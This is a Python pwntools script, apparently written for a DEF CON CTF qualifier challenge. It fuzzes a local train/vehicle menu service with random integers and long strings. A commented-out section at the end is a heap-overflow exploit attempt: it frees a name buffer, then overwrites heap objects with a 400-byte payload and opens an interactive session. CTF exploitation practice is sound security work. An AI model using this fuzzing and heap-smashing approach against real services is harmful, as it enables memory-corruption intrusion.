from pwn import *
import random
import sys
import time

# exit(0)
# s = remote("awsno_cfeaa78b474521963ccfd450cd938ce9.quals.shallweplayaga.me", 80)

while True:
  try:
    HOST="127.0.0.1"
    s = remote(HOST, 9345)
    prevl = s.level
#s.level = 'debug'

    def g(data):
      fp = open("./log", "ab++")
      fp.write(data)
      fp.close()
      #pass

#os.system("clear")
    head = "GET /trains HTTP/1.1\r\nnContent-Type: text/html\n\n\n"
    head = "GET /vehicles HTTP/1.0\r\n\r\n"
    g(head)
    s.send(head)
#print "stage1"
    print s.recv(1024)
    print "WTF"



    luck = random.randrange(1, 5)

    count = 0

    start = 0

    os.system("mv log log_last")

    for x in range(1, 100):
      luck = random.randrange(1, 5)
      if start == 0 or luck == 1: # add
        g("1\n")
        s.send("1\n")
        for i in range(0, 4):
          a = random.randrange(0, 5)
          if a == 0 or a == 1 or a == 2 or a == 3:
            a = random.randrange(-0xffff, 0x10000)
            g("%d\n" % a)
            s.send("%d\n" % a)
          elif a == 4:
            a = "X" * random.randrange(1, 0x100)
            g(a + "\n")
            s.send(a + "\n")
        g("1222\n")
        s.send("1222\n") # Cost
        count += 1
        start = 1
        data = s.recv(1024)
        print data
      elif luck == 2: # list
        g("2\n")
        s.send("2\n")
      elif luck == 3: # remove
        g("3\n")
        s.send("3\n")
        a = random.randrange(0, 2)
        if a == 0:
          tmp = random.randrange(-100, 100)
          g("%d\n" % (tmp))
          s.send("%d\n" % (tmp))
        elif a == 1:
          a = random.randrange(1, count+1)
          g("%d\n" % (a))
          s.send("%d\n" % (a))
      elif luck == 4: # update
        for i in range(0, 4):
          a = random.randrange(0, 2)
          if a == 0: # update yes or no
            g("y\n")
            s.send("y\n")
            a = random.randrange(0, 5)
            if a == 0 or a == 1 or a == 2 or a == 3:
              a = random.randrange(-0xffff, 0x10000)
              g("%d\n" % a)
              s.send("%d\n" % a)
            elif a == 4:
              a = "Z" * random.randrange(1, 0x100)
              g(a + "\n")
              s.send(a + "\n")
          elif a == 1:
            g("n\n")
            s.send("n\n")
        g("y\n2333\n")
        s.send("y\n2333\n")
      print "Loop %d" % (x)

    print "OKAY"
  except:
    pass

"""
for i in range(0, 1000):
  #print "FUCK"
  #data = s.recv(1024)
  a = random.randrange(1, 8)
  print "PICKED %d" % (a)
  s.send("%d\n" % (a))
  data = s.recv(1024)
  luck = random.randrange(0, 4)
  if luck == 0 or luck == 1 or luck == 2:
  	a = random.randrange(-0xffff, 0x10000)
  	s.send("%d\n" % a)
  else:
  	a = "a\n" * random.randrange(0, 2000)
  	s.send(a)
  data = s.recv(1024)
  print data

print "OKAY"
"""
"""
# create 3 trains
for i in range(1,3+1):
  s.recvuntil('Add train')
  s.send("1\n")
  s.send("n%d\n" %i)
  s.send("modelmodelmo%d\n" %i)
  s.send("typetypetype%d\n" %i)
  s.send("0\n")
  s.send("0\n")

print "=== OKAY ==="
#create a hole where the 2nd name was
s.send("4\n")
s.send("n\n")
s.send("2\n")
s.send("y\n")
s.send("x2\n") #this frees the old name, which will then be used as input we can smash from since it was ~32 in size.

s.send("7\n")
s.recvuntil('Enter Index')
#s.send("1234\x00" + "A"*10   +"\n")
s.send("1234" + "\x00" + "A"*400  +"\n")   #this smashes into our hole, overwriting ada objects on the heap

s.send("0"   +"\n")   # last index


s.send("2"   +"\n")   #  trigger a print


#print s.recv(1024)
s.level = prevl
s.interactive() #lets see if we survived

s.close()

"""
